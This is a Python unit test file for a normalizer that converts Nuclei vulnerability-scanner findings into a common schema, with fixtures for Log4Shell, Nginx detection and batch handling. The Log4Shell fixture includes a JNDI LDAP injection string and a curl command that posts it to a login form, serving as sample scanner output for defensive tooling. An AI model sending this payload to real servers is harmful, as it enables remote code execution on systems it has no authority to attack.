"""
Unit tests for Nuclei normalizer.
"""

from normalization.nuclei_normalizer import NucleiNormalizer
from normalization.schema import SeverityLevel


def test_normalize_raw_nuclei_jsonl_finding():
    raw_finding = {
        "template-id": "cve-2021-44228-log4j",
        "info": {
            "name": "Apache Log4j RCE (Log4Shell)",
            "author": ["geeknik"],
            "tags": ["cve", "cve2021", "rce", "oast", "log4j"],
            "description": "Apache Log4j2 JNDI features do not protect against attacker controlled LDAP.",
            "reference": [
                "https://nvd.nist.gov/vuln/detail/CVE-2021-44228",
                "https://logging.apache.org/log4j/2.x/security.html"
            ],
            "severity": "critical",
            "remediation": "Upgrade Log4j to 2.15.0 or newer.",
            "classification": {
                "cve-id": "CVE-2021-44228",
                "cwe-id": ["cwe-502"],
                "cvss-score": 10.0,
                "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H"
            }
        },
        "type": "http",
        "host": "http://example.com:8080",
        "matched-at": "http://example.com:8080/login",
        "extracted-results": ["${jndi:ldap://interact.sh/a}"],
        "matcher-name": "interactsh-matcher",
        "curl-command": "curl -X POST -d 'user=${jndi:ldap://interact.sh/a}' http://example.com:8080/login"
    }

    canonical = NucleiNormalizer.normalize(raw_finding)

    assert canonical.scanner == "nuclei"
    assert canonical.title == "Apache Log4j RCE (Log4Shell)"
    assert canonical.severity == SeverityLevel.CRITICAL
    assert canonical.cve == "CVE-2021-44228"
    assert canonical.cvss == 10.0
    assert canonical.cwe == "CWE-502"
    assert canonical.cwe_list == ["CWE-502"]
    assert canonical.asset == "example.com:8080"
    assert canonical.url == "http://example.com:8080/login"
    assert canonical.method == "POST"
    assert canonical.confidence is None
    assert canonical.solution == "Upgrade Log4j to 2.15.0 or newer."
    assert "interactsh-matcher" in (canonical.evidence or "")
    assert "jndi:ldap" in (canonical.evidence or "")
    assert "cve" in canonical.tags
    assert len(canonical.references) == 2
    assert canonical.raw_finding == raw_finding
    assert canonical.finding_id.startswith("find_")
    assert canonical.fingerprint is not None


def test_normalize_simplified_nuclei_finding():
    simplified_finding = {
        "scanner": "nuclei",
        "template_id": "tech-detect",
        "name": "Nginx Web Server Detected",
        "severity": "info",
        "matched_at": "http://localhost:8080",
        "description": "Nginx web server is running on the target.",
        "reference": "https://nginx.org",
        "tags": ["tech", "nginx"]
    }

    canonical = NucleiNormalizer.normalize(simplified_finding)

    assert canonical.scanner == "nuclei"
    assert canonical.title == "Nginx Web Server Detected"
    assert canonical.severity == SeverityLevel.INFO
    assert canonical.cve is None
    assert canonical.cvss is None
    assert canonical.cwe is None
    assert canonical.asset == "localhost:8080"
    assert canonical.url == "http://localhost:8080"
    assert "nginx" in canonical.tags


def test_normalize_nuclei_cve_from_template_id():
    finding_without_classification = {
        "template-id": "cve-2023-38606-ios",
        "info": {
            "name": "Apple WebKit Vulnerability",
            "severity": "high"
        },
        "matched-at": "https://target.com"
    }

    canonical = NucleiNormalizer.normalize(finding_without_classification)
    assert canonical.cve == "CVE-2023-38606"
    assert canonical.severity == SeverityLevel.HIGH


def test_normalize_nuclei_batch():
    findings = [
        {"template-id": "t1", "info": {"name": "Test 1", "severity": "high"}},
        {"template-id": "t2", "info": {"name": "Test 2", "severity": "low"}}
    ]
    batch = NucleiNormalizer.normalize_batch(findings)
    assert len(batch) == 2
    assert batch[0].severity == SeverityLevel.HIGH
    assert batch[1].severity == SeverityLevel.LOW
